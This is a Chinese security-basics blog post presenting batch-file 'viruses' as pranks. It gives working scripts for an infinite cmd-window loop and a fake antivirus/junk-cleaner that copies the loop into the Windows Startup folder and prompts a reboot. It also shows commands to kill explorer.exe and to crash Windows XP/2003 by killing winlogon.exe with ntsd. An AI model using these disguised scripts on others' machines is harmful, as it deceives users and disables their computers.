<h2 id="病毒"><a href="#病毒" class="headerlink" title="病毒"></a>病毒</h2><p>这里提到的病毒，不能算真正的病毒，可以认为是一些整人的手段或把戏。因为这些病毒是基于Dos命令，进行磁盘文件的修改等操作，如果同样有过Dos命令经验的人，就很容易识破这样的把戏。真正的病毒大多要涉及到操作系统底层的修改，更偏向二进制方面。</p>
<h3 id="无限CMD"><a href="#无限CMD" class="headerlink" title="无限CMD"></a>无限CMD</h3><p>首先来看简单的无限CDM的实现，仅仅需要3行指令即可实现：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:Inf</span><br><span class="line"><span class="built_in">start</span> <span class="built_in">cmd</span></span><br><span class="line"><span class="keyword">goto</span> Inf</span><br></pre></td></tr></tbody></table></figure></div>

<p>效果如下：</p>
<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/InfCMD.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/InfCMD.png"></a>

<p>这里补充说明一下start命令。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 命令：<span class="built_in">start</span>/<span class="built_in">start</span> <span class="built_in">cmd</span></span><br><span class="line">   含义：新打开一个命令行窗口</span><br></pre></td></tr></tbody></table></figure></div>

<p>虽然无限CMD很好实现，但是有所警惕的人一般不会点开，这时我们就需要给这个代码做一点伪装。</p>
<h3 id="伪装杀毒软件"><a href="#伪装杀毒软件" class="headerlink" title="伪装杀毒软件"></a>伪装杀毒软件</h3><p>这里先来看代码，然后再分析这个代码做了什么：</p>
<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/InfCMD_2_code.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/InfCMD_2_code.png"></a>

<p>先来看第一部分：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">cd</span> c:\</span><br><span class="line"><span class="built_in">md</span> a</span><br><span class="line"><span class="built_in">echo</span> :<span class="built_in">start</span> > C:\a\virus.bat</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">start</span> <span class="built_in">cmd</span> >> C:\a\virus.bat</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">goto</span> <span class="built_in">start</span> >> C:\a\virus.bat</span><br><span class="line"><span class="built_in">copy</span> C:\a\virus.bat "C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\" ><span class="built_in">nul</span></span><br></pre></td></tr></tbody></table></figure></div>

<ul>
<li><p>这里首先是关闭命令的显示，切换到C盘，创建一个文件夹a。</p>
</li>
<li><p>然后使用echo指令，在文件夹a中创建批处理文件virus.bat，并将无限打开cmd的指令写入。</p>
</li>
<li><p>接着将该批处理文件复制到当前用户的 <strong>”启动“ 文件夹</strong>下，这个文件夹有啥用呢？这<strong>是Windows开机自启动的文件夹，当电脑开机后，Windows会自动执行该文件夹下的程序</strong>，当我们把无限cmd批处理放到该目录下时，每当电脑启动时，就会进入这样的死循环，这样的恶作剧会让用户很是头疼。但每个平台下的路径是不一样的，用户名也不一样，如何写出一个通用的指令呢？这时需要用到一个系统变量%UserProfile%，前面讲到了，用Set设置的变量可以通过%*%的形式获取到它的值，这个变量就是系统变量，Windows中定义了很多系统变量（可以<a href="https://blog.csdn.net/evilcry2012/article/details/79447194" target="_blank" rel="noopener">参考此篇</a>），%UserProfile%就是其中之一，它对应的值则是”C:\User\用户名”，<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/userprofile.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/userprofile.png"></a> 可以看到，我这里UserProfile对应的就是 “C:\Documents and Settings\Administrator” ，所以我们可以把</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> C:\a\virus.bat "C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\" ><span class="built_in">nul</span></span><br></pre></td></tr></tbody></table></figure></div>

<p>改成</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> C:\a\virus.bat "<span class="variable">%USERPROFILE%</span>\「开始」菜单\程序\启动\" ><span class="built_in">nul</span></span><br></pre></td></tr></tbody></table></figure></div>

<p>这样就可以在WindowsXP/Windows2003的系统上完成功能的实现了，当然对于别的版本的Windows路径可能会有所不同，需要做相应修改。</p>
</li>
</ul>
<p>然后我们来看剩下的部分：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理中，请不要关闭窗口======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">ping</span> -n <span class="number">2</span> <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> ><span class="built_in">nul</span></span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理完毕，共清理垃圾<span class="number">500</span>M ======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 建议立即重启电脑 ======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">set</span> /p u=是否重启电脑(y/n):</span><br><span class="line"><span class="keyword">if</span> <span class="variable">%u%</span>=="y" <span class="keyword">goto</span> s</span><br><span class="line"><span class="built_in">pause</span></span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">:s</span><br><span class="line">shutdown -r -t <span class="number">1</span></span><br><span class="line"></span><br><span class="line">:error</span><br><span class="line"><span class="built_in">echo</span>   ====== 程序运行失败，请使用【管理员权限】重新运行！======</span><br><span class="line"><span class="built_in">pause</span></span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></tbody></table></figure></div>

<ul>
<li>这部分，主要是打印出一个界面，在Dos中看到一个界面，让人误以为是个杀毒软件，然后按照你的步骤执行</li>
<li>值得注意的是那条ping语句，输出通过>nul丢掉了，但是依旧会执行，<strong>”-n“ 这个参数用来设置发包的数量</strong>，这条ping语句的作用就是，给人一种有程序正在执行的感觉（发包越多，等待时间越长），让人误以为正在进行电脑垃圾清理。</li>
<li>最后是一条重启电脑指令，这样，等到重启后，电脑就会因为开机自动打开无限CMD的脚本，最终至死机</li>
</ul>
<p>执行时，表现如下：</p>
<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/InfCMD_2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/InfCMD_2.png"></a>

<p>可以看到，生成的virus.bat会被写入到 “启动” 文件夹的位置，并且提示是否需要重启，若重启，则开机后便会后上面的无限CMD结果一样。</p>
<h3 id="杀死桌面"><a href="#杀死桌面" class="headerlink" title="杀死桌面"></a>杀死桌面</h3><p>桌面也是可以被杀死的，桌面存在的原因是为了能够让电脑使用起来更加方面，从而打造的GUI界面。但是<strong>桌面也只是一个进程（explorer.exe）</strong>，在开机时该进程会启动而已。所以我们只需要关掉这个进程，就可以杀死桌面，下面介绍一条指令：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 命令：<span class="built_in">taskkill</span></span><br><span class="line">   描述：按照进程PID或映像名称终止任务</span><br><span class="line">   参数：/pid (指定要终止的进程的pid,使用tasklist取得pid)</span><br><span class="line">        /im (指定要终止的进程映像名称)</span><br><span class="line">        /f (强制终止进程)</span><br><span class="line">   用法：<span class="built_in">taskkill</span> /im explorer.exe /f</span><br></pre></td></tr></tbody></table></figure></div>

<p>执行时状态如下：</p>
<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/taskkill.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/taskkill.png"></a>

<p>那桌面被杀死了，该如何使用呢？这是只需要将explorer.exe进程重新启起来就行，该程序<strong>通常位于 “c:\windows” 目录下</strong>，可以使用指令：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">start</span> C:\windows\explorer.exe</span><br></pre></td></tr></tbody></table></figure></div>

<p>重启桌面进程，效果如下：</p>
<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/taskkill_2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/taskkill_2.png"></a>



<h3 id="蓝屏"><a href="#蓝屏" class="headerlink" title="蓝屏"></a>蓝屏</h3><p>这里涉及到一个调试工具ntsd，该调试工具主要位于WindowsXP/2003版本中，可以用来强制结束进程。刚刚的taskkill不也可以结束进程吗？为什么需要ntsd？来看一个例子：</p>
<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/ntsd.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/ntsd.png"></a>

<p>taskkill并不能结束所有进程，所以这时候就需要ntsd。这里出现的winlogon.exe又是什么进程呢？<strong>winlogon.exe是一个系统核心进程，用于管理用户登录和退出。</strong>强行关闭则会引起蓝屏。下面简要说明下ntsd的语法：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 命令：ntsd</span><br><span class="line">   含义：强行关闭进程</span><br><span class="line">   语法：ntsd -c q -p pid (根据pid关闭进程)</span><br><span class="line">        ntsd -c q -pn ***.exe (根据映像名关闭进程)</span><br></pre></td></tr></tbody></table></figure></div>

<p>可以尝试在WindowsXP/2003中执行如下指令：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntsd -c q -pn winlogon.exe</span><br></pre></td></tr></tbody></table></figure></div>

<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/ntsd_2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/ntsd_2.png"></a>

<p>结果显而易见，蓝屏并重启。</p>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><ol>
<li><a href="https://www.bilibili.com/video/BV1i7411G7vm?p=14" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1i7411G7vm?p=14</a> （千峰网络开源课程p14~p15）</li>
<li><a href="https://blog.csdn.net/weixin_43252204/article/details/105389619" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43252204/article/details/105389619</a> （Beglage_buglige关于本篇内容的学习笔记）</li>
<li><a href="https://blog.csdn.net/evilcry2012/article/details/79447194" target="_blank" rel="noopener">https://blog.csdn.net/evilcry2012/article/details/79447194</a> （CSDN博客-系统变量与路径的对应关系）</li>
</ol>
</body></html></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">cataLoc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://cataloc.gitee.io/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/">http://cataloc.gitee.io/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/blog/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全    </a></div><div class="post_share"><div class="social-share" data-image="https://gitee.com/cataloc/blog/raw/master/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/cover0xC.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> Donate<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="/blog/img/wechat.jpg" alt="微信"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="/blog/img/alipay.jpg" alt="支付寶"><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/blog/2020/06/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8B-%E7%94%A8%E6%88%B7%E4%B8%8E%E7%BB%84%E7%AE%A1%E7%90%86/"><img class="prev_cover lazyload" data-src="https://gitee.com/cataloc/blog/raw/master/2020/06/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8B-%E7%94%A8%E6%88%B7%E4%B8%8E%E7%BB%84%E7%AE%A1%E7%90%86/cover0xD.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">Previous Post</div><div class="prev_info"><span>网络安全基础03(下)：用户与组管理</span></div></a></div><div class="next-post pull_right"><a href="/blog/2020/06/09/Dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA/"><img class="next_cover lazyload" data-src="https://gitee.com/cataloc/blog/raw/master/2020/06/09/Dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA/cover0xB.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">Next Post</div><div class="next_info"><span>Dalvik虚拟机</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> Recommend</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/blog/2020/03/07/浅谈对称加密传输/" title="浅谈对称加密传输"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/default.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-03-07</div><div class="relatedPosts_title">浅谈对称加密传输</div></div></a></div><div class="relatedPosts_item"><a href="/blog/2020/06/01/网络安全基础01-配置虚拟机/" title="网络安全基础01：配置虚拟机"><img class="relatedPosts_cover lazyload"data-src="https://gitee.com/cataloc/blog/raw/master/2020/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8001-%E9%85%8D%E7%BD%AE%E8%99%9A%E6%8B%9F%E6%9C%BA/cover0x08.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-06-01</div><div class="relatedPosts_title">网络安全基础01：配置虚拟机</div></div></a></div><div class="relatedPosts_item"><a href="/blog/2020/06/02/网络安全基础02-IP地址-Dos命令/" title="网络安全基础02：IP地址&Dos命令"><img class="relatedPosts_cover lazyload"data-src="https://gitee.com/cataloc/blog/raw/master/2020/06/02/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8002-IP%E5%9C%B0%E5%9D%80-Dos%E5%91%BD%E4%BB%A4/cover0x09.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-06-02</div><div class="relatedPosts_title">网络安全基础02：IP地址&Dos命令</div></div></a></div><div class="relatedPosts_item"><a href="/blog/2020/06/18/网络安全基础03-下-用户与组管理/" title="网络安全基础03(下)：用户与组管理"><img class="relatedPosts_cover lazyload"data-src="https://gitee.com/cataloc/blog/raw/master/2020/06/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8B-%E7%94%A8%E6%88%B7%E4%B8%8E%E7%BB%84%E7%AE%A1%E7%90%86/cover0xD.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-06-18</div><div class="relatedPosts_title">网络安全基础03(下)：用户与组管理</div></div></a></div><div class="relatedPosts_item"><a href="/blog/2020/06/29/网路安全基础03-实验/" title="网路安全基础03(实验)：破解Win7登录密码"><img class="relatedPosts_cover lazyload"data-src="https://gitee.com/cataloc/blog/raw/master/2020/06/29/%E7%BD%91%E8%B7%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E5%AE%9E%E9%AA%8C/cover0xF.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-06-29</div><div class="relatedPosts_title">网路安全基础03(实验)：破解Win7登录密码</div></div></a></div><div class="relatedPosts_item"><a href="/blog/2020/09/22/网络安全基础04-上-NTFS权限/" title="网络安全基础04(上)：NTFS权限"><img class="relatedPosts_cover lazyload"data-src="https://gitee.com/cataloc/blog/raw/master/2020/09/22/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8004-%E4%B8%8A-NTFS%E6%9D%83%E9%99%90/cover0x39.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-09-22</div><div class="relatedPosts_title">网络安全基础04(上)：NTFS权限</div></div></a></div></div><div class="clear_both"></div></div></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2020 By cataLoc</div><div class="framework-info"><span>Driven </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="Read Mode"></i><i class="fa fa-plus" id="font_plus" title="Increase font size"></i><i class="fa fa-minus" id="font_minus" title="Decrease font size"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="Traditional Chinese and Simplified Chinese Conversion" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="Dark Mode"></i></div><div id="rightside-config-show"><div id="rightside_config" title="Setting"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="Table of Contents" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="Back to top" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/blog/js/utils.js"></script><script src="/blog/js/main.js"></script><script src="/blog/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="ribbon_piao" mobile="false" src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script></body></html>